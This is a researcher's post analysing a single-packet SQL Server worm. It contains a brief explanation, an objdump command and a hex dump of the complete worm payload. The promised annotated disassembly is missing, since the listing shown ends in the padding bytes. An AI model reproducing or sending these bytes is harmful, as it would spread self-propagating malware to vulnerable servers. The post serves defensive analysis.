this worm is completely contained inside its 376 byte payload; 
i disassembled the code itself (search for "start here") after
the nops to find out what it does.  there are some annotations;
most should make sense but feel free to let me know if i'm 
way off.

the short story: it sends copies of itself to everyone.
it does not store anything on the file system or even change
anything directly.  i do not know where the flaw in sqlserver
is, although it seems like this is pretty well known already
(for instance, there is a similar exploit at 
http://www.ysgnet.com/hn/exploits/adv_win32_shellcode.txt)
shutting down sqlserver will completely stop this (although
you will still be vulnerable again, of course)

this was disassembled from www.boredom.org/~cstone/onepacket
which is a pcap capture of a single packet.

if you don't know how to work objdump, here's how:
objdump -s -m i386 -b binary -z --disassemble-all --start-address 0xc0 --show-raw-insn duh.pcap

--cstone@pobox.com

duh.pcap:     file format binary

Contents of section .data:
 0000 d4c3b2a1 02000400 00000000 00000000  ÔÃēĄ............
 0010 88130000 01000000 0d40323e ff7b0200  .........@2>ĸ{..
 0020 a2010000 a2010000 00e08121 e1660005  Ē...Ē....ā.!áf..
 0030 dd79e870 08004500 01943127 00007411  Ýyčp..E...1'..t.
 0040 53ce9320 8178d1a6 da240fb0 059a0180  SÎ. .xŅĶÚ$.°....
 0050 65370401 01010101 01010101 01010101  e7..............
 0060 01010101 01010101 01010101 01010101  ................
 0070 01010101 01010101 01010101 01010101  ................
 0080 01010101 01010101 01010101 01010101  ................
 0090 01010101 01010101 01010101 01010101  ................
 00a0 01010101 01010101 01010101 01010101  ................
 00b0 010101dc c9b042eb 0e010101 01010101  ...ÜÉ°Bë........
 00c0 70ae4201 70ae4290 90909090 90909068  pŪB.pŪB........h
 00d0 dcc9b042 b8010101 0131c9b1 1850e2fd  ÜÉ°Bļ....1Éą.Pâý
 00e0 35010101 055089e5 51682e64 6c6c6865  5....P.åQh.dllhe
 00f0 6c333268 6b65726e 51686f75 6e746869  l32hkernQhounthi
 0100 636b4368 47657454 66b96c6c 51683332  ckChGetTfđllQh32
 0110 2e646877 73325f66 b9657451 68736f63  .dhws2_fđetQhsoc
 0120 6b66b974 6f516873 656e64be 1810ae42  kfđtoQhsendū..ŪB
 0130 8d45d450 ff16508d 45e0508d 45f050ff  .EÔPĸ.P.EāP.EðPĸ
 0140 1650be10 10ae428b 1e8b033d 558bec51  .Pū..ŪB....=U.ėQ
 0150 7405be1c 10ae42ff 16ffd031 c9515150  t.ū..ŪBĸ.ĸÐ1ÉQQP
 0160 81f10301 049b81f1 01010101 518d45cc  .ņ.....ņ....Q.EĖ
 0170 508b45c0 50ff166a 116a026a 02ffd050  P.EĀPĸ.j.j.j.ĸÐP
 0180 8d45c450 8b45c050 ff1689c6 09db81f3  .EÄP.EĀPĸ..Æ.Û.ó
 0190 3c61d9ff 8b45b48d 0c408d14 88c1e204  <aŲĸ.Eī..@...Áâ.
 01a0 01c2c1e2 0829c28d 049001d8 8945b46a  .ÂÁâ.)Â....Ø.Eīj
 01b0 108d45b0 5031c951 6681f178 01518d45  ..E°P1ÉQf.ņx.Q.E
 01c0 03508b45 ac50ffd6 ebca               .P.EŽPĸÖëĘ      
Disassembly of section .data:

00000000 <.data>:
   0:	d4 c3                	aam    $0xffffffc3
   2:	b2 a1                	mov    $0xa1,%dl
   4:	02 00                	add    (%eax),%al
   6:	04 00                	add    $0x0,%al
   8:	00 00                	add    %al,(%eax)
   a:	00 00                	add    %al,(%eax)
   c:	00 00                	add    %al,(%eax)
   e:	00 00                	add    %al,(%eax)
  10:	88 13                	mov    %dl,(%ebx)
  12:	00 00                	add    %al,(%eax)
  14:	01 00                	add    %eax,(%eax)
  16:	00 00                	add    %al,(%eax)
  18:	0d 40 32 3e ff       	or     $0xff3e3240,%eax
  1d:	7b 02                	jnp    0x21
  1f:	00 a2 01 00 00 a2    	add    %ah,0xa2000001(%edx)
  25:	01 00                	add    %eax,(%eax)
  27:	00 00                	add    %al,(%eax)
  29:	e0 81                	loopne 0xffffffac
  2b:	21 e1                	and    %esp,%ecx
  2d:	66                   	data16
  2e:	00 05 dd 79 e8 70    	add    %al,0x70e879dd
  34:	08 00                	or     %al,(%eax)
  36:	45                   	inc    %ebp
  37:	00 01                	add    %al,(%ecx)
  39:	94                   	xchg   %eax,%esp
  3a:	31 27                	xor    %esp,(%edi)
  3c:	00 00                	add    %al,(%eax)
  3e:	74 11                	je     0x51
  40:	53                   	push   %ebx
  41:	ce                   	into   
  42:	93                   	xchg   %eax,%ebx
  43:	20 81 78 d1 a6 da    	and    %al,0xdaa6d178(%ecx)
  49:	24 0f                	and    $0xf,%al
  4b:	b0 05                	mov    $0x5,%al
  4d:	9a 01 80 65 37 04 01 	lcall  $0x104,$0x37658001
  54:	01 01                	add    %eax,(%ecx)
  56:	01 01                	add    %eax,(%ecx)
  58:	01 01                	add    %eax,(%ecx)
  5a:	01 01                	add    %eax,(%ecx)
  5c:	01 01                	add    %eax,(%ecx)
  5e:	01 01                	add    %eax,(%ecx)
  60:	01 01                	add    %eax,(%ecx)
  62:	01 01                	add    %eax,(%ecx)
  64:	01 01                	add    %eax,(%ecx)
  66:	01 01                	add    %eax,(%ecx)
  68:	01 01                	add    %eax,(%ecx)
  6a:	01 01                	add    %eax,(%ecx)
  6c:	01 01                	add    %eax,(%ecx)
  6e:	01 01                	add    %eax,(%ecx)
  70:	01 01                	add    %eax,(%ecx)
  72:	01 01                	add    %eax,(%ecx)
  74:	01 01                	add    %eax,(%ecx)
  76:	01 01                	add    %eax,(%ecx)
  78:	01 01                	add    %eax,(%ecx)
  7a:	01 01                	add    %eax,(%ecx)
  7c:	01 01                	add    %eax,(%ecx)
  7e:	01 01                	add    %eax,(%ecx)
  80:	01 01                	add    %eax,(%ecx)
  82:	01 01                	add    %eax,(%ecx)
  84:	01 01                	add    %eax,(%ecx)
  86:	01 01                	add    %eax,(%ecx)
  88:	01 01                	add    %eax,(%ecx)
  8a:	01 01                	add    %eax,(%ecx)
  8c:	01 01                	add    %eax,(%ecx)
  8e:	01 01                	add    %eax,(%ecx)
  90:	01 01                	add    %eax,(%ecx)
  92:	01 01                	add    %eax,(%ecx)
  94:	01 01                	add    %eax,(%ecx)
  96:	01 01                	add    %eax,(%ecx)
  98:	01 01                	add    %eax,(%ecx)
  9a:	01 01                	add    %eax,(%ecx)
